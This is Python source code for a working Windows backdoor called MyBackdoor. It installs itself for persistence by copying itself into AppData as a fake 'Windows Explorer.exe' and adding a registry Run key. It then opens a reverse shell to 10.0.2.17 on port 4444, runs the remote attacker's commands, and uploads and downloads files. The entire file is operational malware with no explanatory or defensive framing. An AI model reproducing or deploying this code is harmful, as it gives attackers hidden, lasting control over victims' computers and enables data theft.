#!/usr/bin/env python


import socket, subprocess, json, os, base64, sys, shutil
 
class MyBackdoor:
	def __init__(self, ip, port):
		self.persistent()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
	
	def persistent(self):
		file_destination = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(file_destination):
			shutil.copyfile(sys.executable, file_destination)
			subprocess.call('reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v update /t REG_SZ /d "'+ file_destination + '"', shell=True)

	def send_data(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)
 
	def receive_data(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def sys_command(self, command):
		DEVNULL = open(os.devnull, 'wb')
		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

	def change_curr_dir(self, path):
		os.chdir(path)
		return "[+] Changing working directory to " + path

	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successful."

	def run(self):
		while True:
			command = self.receive_data()

			try:
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_curr_dir(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result = self.sys_command(command)
			except Exception as e:
				command_result = "[!] An error occurred."

			self.send_data(command_result)



if __name__ == '__main__':
	try:
		my_backdoor = MyBackdoor("10.0.2.17", 4444)
		my_backdoor.run()
	except Exception:
		sys.exit()



